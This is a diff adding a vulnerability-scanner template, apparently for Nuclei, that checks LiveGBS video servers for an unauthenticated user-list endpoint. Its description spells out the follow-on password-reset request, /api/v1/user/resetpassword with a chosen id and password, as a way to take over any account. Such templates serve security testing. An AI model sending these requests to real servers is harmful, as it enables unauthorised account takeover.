@@ -1,0 +1,29 @@
+id: livegbs-unauth-reset-passwd
+
+info:
+  name: LiveGBS任意用户密码重置漏洞
+  author: xxx
+  severity: high
+  description: LiveGBS部分接口存在未授权访问导致，可以通过组合漏洞修改任意用户密码;通过获取的id请求/api/v1/user/resetpassword?id=22&password=123456重置密码
+  tags: LiveGBS
+
+http:
+  - raw:
+      - |+
+        @timeout: 30s
+        GET /api/v1/user/list?q=&start=&limit=10&enable=&sort=CreatedAt&order=desc HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ID"
+          - "Username"
+        condition: and
+      - type: status
+        status:
+          - 200
